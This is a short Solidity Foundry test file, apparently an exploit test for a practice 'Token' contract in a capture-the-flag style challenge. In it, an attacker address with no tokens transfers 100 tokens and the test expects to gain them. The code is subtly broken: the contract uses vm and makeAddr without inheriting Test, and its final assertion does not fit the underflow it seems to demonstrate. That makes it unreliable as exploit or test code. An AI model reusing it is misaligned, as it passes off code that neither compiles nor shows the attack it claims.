// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";

import {Token} from "../src/Token.sol";

contract TokenHack {
    Token target;

    function setUp() public {
        target = new Token(100);
    }

    function test_Token() public {
        address attacker = makeAddr("attacker");
        uint256 balance = 1 ether;
        vm.deal(attacker, balance);

        uint256 balanceBefore = target.balanceOf(attacker);
        assertEq(balanceBefore, 0);

        // Attack
        vm.startPrank(attacker);
        target.transfer(address(target), 100);

        uint256 balanceAfter = target.balanceOf(attacker);
        assertEq(balanceAfter, 100);
    }
}
